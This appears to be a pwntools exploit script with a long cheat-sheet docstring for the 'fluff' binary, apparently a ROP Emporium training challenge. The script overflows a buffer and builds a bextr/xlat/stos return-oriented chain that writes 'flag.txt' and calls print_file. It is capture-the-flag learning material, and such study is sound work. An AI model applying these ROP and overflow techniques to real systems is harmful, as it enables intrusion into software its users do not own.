from pwn import *

"""
How to:
    Unknown register???
        Check here and keep in mind that anything below 32 means the last x (16,8,4) bits
        https://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture
    What does an instruction do???
        https://www.felixcloutier.com/x86/index.html

    Check the file for security features
        checksec --file=<binary>                            #Check the security on the binary

    Check the binary for interesting things    
        rabin2 -qs <binary>                                 #Functions inside of the binary
        rabin2 -i <binary>                                  #Imported functions and where they are located
        rabin2 -z <binary>                                  #Programmer specific strings
        objdump -D <binary>                                 #Disassembles everything on the binary
        readelf -S <binary>                                 #Show section headers with information 
       
    Python things:
        cyclic(100, alphabet='bcdef')                                   #alphabet arg is useful for bad characters
        python3 -c 'from pwn import *; print(hexdump("agx."))'          #Prints hex of string in usual hex format
        python3 -c 'from pwn import *; print(enhex(b"agx."))'           #Prints hex of string in copy friendly format
        python3 -c 'from pwn import *; print(p32(0x80483d0))'           #Prints the x32 address in little endian
        python3 -c 'from pwn import *; print(p64(0x0000000000400693))'  #Prints the x64 address in little endian

    Inside of gdb:
        info functions                                      #Shows the functions
        disas <function>                                    #Shows the assembly for the function specified
        p <string>                                          #Grabs the address of the specified object
        search "<string>"                                   #Search for a string and show its address
        jump <function or *Address>                         #Jumps to function or address
        b <function or *Address>                            #Sets up a breakpoint
        More into the potatos (32):
            pattern create <#> {output file}                #Creates a pattern for finding offset
            pattern offset <#>                              #Finds the offset mentioned
    
    Need a ROP?
        ropper -f <file> --search mov                       #Move a value into register (Specializes in transfers)
        ropper -f <file> --search pop                       #Pops a value into register (Specializes in setting up a transfer)
        ropper -f <file> --search xchg                      #Switch values              (Is like a transfer but switches)
            xchg   %dl,(%ecx)                               #Switch dl (edx|rdx) and ecx

        ropper -f <file> --search pext                      #PAIN IN THE ASS                                        (Use pext_find_mask.py for these) 
            mov eax, ebp;                                   #Moves ebp into eax                                     (Setting up eax)
            mov ebx, 0xb0bababa;                            #ebx is set at b0bababa                                 (Hardcoded_value in find_mask.py)
            pext edx, ebx, eax;                             #Compares eax to ebx and writes to edx                  (1 = Dest, 2 = Mask {int}, 3 = Input to compare {"Char"})
            mov eax, 0xdeadbeef;                            #Useless after the pext since we already wrote to eax

        ropper -f <file> --search xlat                      
            xlat   %ds:(%rbx)                               #Looks at rbx and stores it in (al)rax                  (Looks at target register and stores it in al{rax})

        ropper -f <file> --search bextr                     
            pop %rdx;                                       #Pop to rdx 
            pop %rcx;                                       #Pop to rcx
            add $0x3ef2,%rcx;                               #Adds random value to rcx                               (Just subtract 3ef2) 
            bextr %rdx,%rcx,%rbx;                           #Compare rbx to rcx and stores in rbx                   (1 = Dest, 2 = Bit extraction happens, 3 = Index value and Length specified)
                                                                                                                    (For what is shown, it is Index,Bit,Dest)

        ropper -f <file> --search stos                      
            stos   %al,%es:(%rdi)                           #Takes rax(al) and stores it in rdi                    (Takes what is specified in first part and stores it in target register)

    64Bit differences:
        Need to grab the RSP beginning instead  
        If the address is only 4 bytes, pad to 8 
        ropper -f <binary>                                  #Shows all rop gadgets in a binary
        ropper -f <binary> --search "pop rdi"               #Shows all rop gadgets that can pop RDI (For system calls, you need to have the target in RDI)
        ***For 64 Bit, try popping rdi at final function***
        ***For 64 Bit, Gadget -> Variables -> Location***
            Example
                print('A'*40 + '\xc3\x07\x40\x00\x00\x00\x00\x00' + '\x60\x10\x60\x00\x00\x00\x00\x00' + '\x60\x05\x40\x00\x00\x00\x00\x00')
                      Buffer ->           POP RDI call            ->     What is going into RDI        ->          System()
        For printing, use the actual location vs 32's arg
            0x08048538 <+14>:    call   0x80483d0 <print_file@plt>
            64Bit                       32Bit

    ARMv5 difference:
        EIP/RIP is now PC
        POP r#, pc is the Arm equiv for the pop rdi
        
    MIPS difference:
        EIP/RIP/PC is now ra
        GDB doesn't like it so you can't use it      #Requires manual checking along with exploit dev
        
"""

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Bad Char finder
def bad_chars(string, badchars):
    # State check
    clear = False
    # Number to do XOR with. Start with 0 just in case base string is ok
    value_to_xor_with = 0
    
    # Key reason for function is that it will go to the next number as soon as it finds a bad character. 
    # It doesn't care if only 1 is found
    while not clear:
        # XOR process
        xored_string = xor(string, value_to_xor_with)
        # Verify bad characters are not in string
        for x in badchars:
            # A bad character was found
            if x in str(xored_string):
                clear = False
                value_to_xor_with += 1
                break

            # A bad character was not found
            if x not in str(xored_string):
                clear = True  

    # Print success and value
    info("XOR key found without bad characters: {}".format(value_to_xor_with))
    return value_to_xor_with, xored_string 


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './fluff'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'info'
# Deletes core files if used
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# Display what the program reports as bad characters
# print(str(io.recvline_contains("badchars are")))

# Grab function symbols
data_section_address = 0x0000000000601028
xlatb = 0x0000000000400628
bextr_rbx = 0x40062a
pop_rdi = 0x4006a3
stosb_rdi_al = 0x400639
print_file = 0x400620

# Print out target addresses
info("%#x data_section_address", data_section_address)
info("%#x xlatb", xlatb)
info("%#x bextr_rbx", bextr_rbx)
info("%#x pop_rdi", pop_rdi)
info("%#x stosb_rdi_al", stosb_rdi_al)
info("%#x print_file", print_file)

# Find Buffer overflow
payload = cyclic(100)

# Send payload
io.sendlineafter("> ", payload)

# Wait for crash
io.wait()

# Displaying what the bits for the program is
info("Running offset check for {} Bits".format(context.bits))

# Read the crash file
core = io.corefile

# Locate for 64 bits
if context.bits == 64:
    # Locate RIP value and offset
    stack = core.rsp
    # Looks for the first 4 characters of the rsp to find the offset for RIP
    pattern = core.read(stack,4)
    # Finds RIP offset with pattern
    offset = cyclic_find(pattern)
    # Display offset
    info("Located RIP at {a}".format(a=offset))

# Locate for 32 bits
elif context.bits == 32:
    # Locate EIP value and offset
    eip_value = core.eip
    offset = cyclic_find(eip_value)
    # Display offset
    info("Located EIP at {a}".format(a=offset))

string_to_write = b"flag.txt"
char_locations = []

# Find each memory location for each char
for char in string_to_write:
    char_addr = hex(read('fluff').find(char) + elf.address)
    char_locations.append(char_addr)
    info("%s found @ %s", chr(char), char_addr)

# Found at pwnme + 150 (This is just what the rax is before going into the *bextr*)
current_rax = 0xb
# Holds the exploit
fluff_exploit = b""


for i, char_location in enumerate(char_locations):
    # Set the initial value so you don't need a lookup for the first value (best case would be null vs something useful)
    if (i != 0):
        current_rax = string_to_write[i - 1]

    # Command: DST, Bit field Extraction, Length
    fluff_exploit += pack(bextr_rbx)
    # 40 since it is 64 bits, index = 00
    fluff_exploit += pack(0x4000)
    # Grab characters location, the current rax value and subtract 3ef2 (add rcx, 0x3ef2;)
    fluff_exploit += pack(int(char_location, 16) - current_rax - 0x3ef2)
    # Result of bextr is loaded into xlatb
    fluff_exploit += pack(xlatb)
    # Prep rdi
    fluff_exploit += pack(pop_rdi)
    # Getting exact writing location
    fluff_exploit += pack(data_section_address + i)
    # Doing stosb
    fluff_exploit += pack(stosb_rdi_al)


# Build the payload
payload = flat({
    offset: [ fluff_exploit,    #Writes the next level exploit
    pop_rdi,                    #Pop rdi for next arg
    data_section_address,       #Where to read
    print_file                  #Print file call
    ]
})
print(str(payload))

# Save the payload to file
write('payload', payload)

# Start the process again
io = start()

# Send the payload
io.sendlineafter('> ', payload)
io.recvuntil('Thank you!\n')

# Or, Get our flag!
flag = io.recv()

try:
    success(flag)
except AttributeError:
    print("[+] Flag: {}".format(str(flag)))


'''
# Where to start?
    Need to write to data
    mov is not avalible 
    stos will store strings but need control of al (rax)
    xlat will allow you to control al (rax) but you need to control rbx
    bextr will allow you to control rbx via rdx and rcx
    
    So order is bextr -> xlat -> stos
        fluff_exploit += pack(bextr_rbx)
        fluff_exploit += pack(0x4000)                                           #Length
        fluff_exploit += pack(int(char_location, 16) - current_rax - 0x3ef2)    #Bit Extraction (No real math? Just location)
        fluff_exploit += pack(xlatb)                                            #Stores in al
        fluff_exploit += pack(pop_rdi)                                          #Prep rdi
        fluff_exploit += pack(data_section_address + i)                         #rdi value
        fluff_exploit += pack(stosb_rdi_al)                                     #writes al into rdi

# Attack Order
    bextr -> xlat -> stos

# How do you know what to do???
    data_section_address = 0x0000000000601028
        readelf -S fluff
            [Nr] Name              Type             Address           Offset        Size              EntSize           Flags  Link  Info  Align
            [23] .data             PROGBITS         0000000000601028  00001028      0000000000000010  0000000000000000  WA     0     0     8

            Addr is what I need
            Size is how much I can write
            **W flag means I can write to it**    

    print_file = 0x400620
        gdb fluff
        disas usefulFunction
            0x0000000000400620 <+9>:     call   0x400510 <print_file@plt>

    bextr_rbx = 0x40062a
        gdb fluff
        disas questionableGadgets
            0x000000000040062a <+2>:     pop    %rdx
            0x000000000040062b <+3>:     pop    %rcx
            0x000000000040062c <+4>:     add    $0x3ef2,%rcx
            0x0000000000400633 <+11>:    bextr  %rdx,%rcx,%rbx
            0x0000000000400638 <+16>:    ret

    xlatb = 0x0000000000400628
        gdb fluff
        disas questionableGadgets
            0x0000000000400628 <+0>:     xlat   %ds:(%rbx)

    stosb_rdi_al = 0x400639
        gdb fluff
        disas questionableGadgets    
            0x0000000000400639 <+17>:    stos   %al,%es:(%rdi)
            0x000000000040063a <+18>:    ret

    pop_rdi = 0x4006a3
        ropper -f fluff --search pop
            0x00000000004006a3: pop rdi; ret;

# Manual Exploitation
LOL...
'''
